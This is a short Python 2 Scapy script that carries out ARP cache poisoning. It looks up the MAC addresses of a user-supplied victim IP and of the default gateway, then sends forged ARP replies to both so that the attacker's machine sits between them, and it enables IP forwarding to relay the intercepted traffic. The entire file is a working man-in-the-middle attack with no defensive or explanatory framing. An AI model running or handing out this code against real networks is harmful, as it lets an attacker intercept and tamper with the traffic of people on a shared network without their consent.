import sys
import signal
from scapy.all import *
import socket
import netifaces

des_ip=raw_input("Input target ip:")
#My IP
my_ip=netifaces.ifaddresses('ens33')[netifaces.AF_INET][0]['addr']

#Gateway IP
gateway_ip=netifaces.gateways()['default'][netifaces.AF_INET][0]

#My mac address
my_mac=netifaces.ifaddresses('ens33')[netifaces.AF_LINK][0]['addr']

#For getting mac address of victim
ans,unans=sr(ARP(op=ARP.who_has,psrc=my_ip,pdst=des_ip,hwsrc=my_mac))

#For getting mac address of gateway
ans_g,unans_g=sr(ARP(op=ARP.who_has,psrc=my_ip,pdst=gateway_ip,hwsrc=my_mac))

#Vicitm mac
result=str(ans[0])
result=result.split(" hwsrc=")[2]
result=result.split(" psrc=")[0]

#Gateway mac
result_g=str(ans_g[0])
result_g=result_g.split(" hwsrc=")[2]
result_g=result_g.split(" psrc=")[0]

choice=raw_input("If you want to start poisoning, print 1: If you don't want, press 2:")

if (choice=='1'):
	send(ARP(op=ARP.is_at,psrc=gateway_ip,pdst=des_ip,hwsrc=my_mac,hwdst=result))
	send(ARP(op=ARP.is_at,psrc=des_ip,pdst=gateway_ip,hwsrc=my_mac,hwdst=result_g))
	#For forwarding
	with open('/proc/sys/net/ipv4/ip_forward','w') as forwarding:
		forwarding.write('1\n')


